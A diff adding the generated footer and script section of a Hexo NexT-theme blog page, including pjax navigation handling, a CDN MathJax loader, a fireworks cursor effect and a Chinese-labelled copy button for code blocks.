+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">43k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:38</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    // window.MathJax = {
+    //   loader: {
+    //
+    //       load: ['[tex]/mhchem'],
+    //
+    //     source: {
+    //       '[tex]/amsCd': '[tex]/amscd',
+    //       '[tex]/AMScd': '[tex]/amscd'
+    //     }
+    //   },
+    //   tex: {
+    //     inlineMath: {'[+]': [['$', '$']]},
+    //
+    //       packages: {'[+]': ['mhchem']},
+    //
+    //     tags: 'ams'
+    //   },
+    //   options: {
+    //     renderActions: {
+    //       findScript: [10, doc => {
+    //         document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+    //           const display = !!node.type.match(/; *mode=display/);
+    //           const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+    //           const text = document.createTextNode('');
+    //           node.parentNode.replaceChild(text, node);
+    //           math.start = {node: text, delim: '', n: 0};
+    //           math.end = {node: text, delim: '', n: 0};
+    //           doc.math.push(math);
+    //         });
+    //       }, '', false],
+    //       insertedScript: [200, () => {
+    //         document.querySelectorAll('mjx-container').forEach(node => {
+    //           let target = node.parentNode;
+    //           if (target.nodeName.toLowerCase() === 'li') {
+    //             target.parentNode.classList.add('has-jax');
+    //           }
+    //         });
+    //       }, '', false]
+    //     }
+    //   }
+    // };
+    window.MathJax = {
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+        processEscapes: true
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+    </div>
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+
+</body>
+</html>
